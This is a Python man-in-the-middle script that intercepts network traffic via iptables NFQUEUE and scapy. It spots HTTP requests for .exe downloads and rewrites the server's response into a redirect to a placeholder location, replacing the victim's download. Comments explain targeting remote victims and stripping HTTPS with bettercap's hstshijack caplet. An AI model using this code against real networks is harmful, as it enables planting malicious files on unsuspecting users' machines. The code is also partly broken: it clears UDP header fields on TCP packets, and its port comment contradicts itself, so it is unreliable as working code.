#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# service apache2 start - START BUILT IN WEB SERVER
# iptables -I FORWARD -j NFQUEUE --queue-num 0      - for remote use
# iptables -I INPUT -j NFQUEUE --queue-num 0        - for testing and with hstshijack
# iptables -I OUTPUT -j NFQUEUE --queue-num 0       - for testing and with hstshijack
# iptables --flush

# for HTTPS:
# bettercap -iface eth0 -caplet hstshijack/hstshijack

ack_list = []
PORT = 8080     # port 80 for https, port 8080 for https with hstshijack


def set_load(packet, load):
    packet[scapy.Raw].load = load

    # remove chksum & len to maintain packet integrity (will be recalculated automatically by scapy)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    replaced_location = "PLACEHOLDER\n\n"
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == PORT:
            # print("HTTP Request")
            # check if request contains an .exe file (most likely a download)
            if b".exe" in scapy_packet[scapy.Raw].load and replaced_location not in scapy_packet[scapy.Raw]:
                print("[+] exe Request")
                # saves the ack of all requests in scope in the list
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == PORT:
            # print("HTTP Response")
            # check if the response is related to any request in scope
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")

                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + replaced_location)

                packet.set_payload(str(modified_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()